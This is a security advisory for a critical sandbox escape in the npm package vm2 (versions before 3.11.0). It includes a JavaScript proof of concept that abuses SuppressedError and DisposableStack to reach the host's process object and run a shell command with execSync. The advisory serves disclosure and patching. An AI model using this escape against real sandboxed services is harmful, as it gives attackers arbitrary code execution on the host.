# [C] VM2 Has a Sandbox Escape Issue via SuppressedError

## Summary
Severity: Critical
Advisory: GHSA-55hx-c926-fr95
CVE: CVE-2026-26332
CWE: CWE-693, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-55hx-c926-fr95
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
In vm2 v3.10.4 on Node.js v24.13.0, `SuppressedError` allows attackers to escape the sandbox and run arbitrary code.

### PoC
```js
const { VM } = require("vm2");

const vm = new VM();

vm.run(`
const ds = new DisposableStack();
ds.defer(() => { throw null; });
ds.defer(() => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  ds.dispose();
} catch(e) {
  const Function = e.suppressed.constructor.constructor;
  const process = new Function("return process;")();
  const { execSync } = process.mainModule.require("node:child_process");
  execSync("echo pwned", { stdio: "inherit" });
}
`);
```

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-55hx-c926-fr95
- https://nvd.nist.gov/vuln/detail/CVE-2026-26332
- https://github.com/patriksimek/vm2/commit/119fd0aa1e4c27b08cf37946b2dafa99e2c754f0
- https://github.com/patriksimek/vm2/commit/4cb82cc94d9bb6c9a918b45f8c6790c32a5e913f
- https://github.com/patriksimek/vm2/commit/7395c3a4b01d302e55271c87dbeb44d6b83b81ca
- https://github.com/patriksimek/vm2/commit/792e16d56ee429ab19e284ed9c545f5e4694fb7d
- https://github.com/patriksimek/vm2/commit/d715dd88c5aec5bbb4dce03ddf7c3eb3791d0338
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
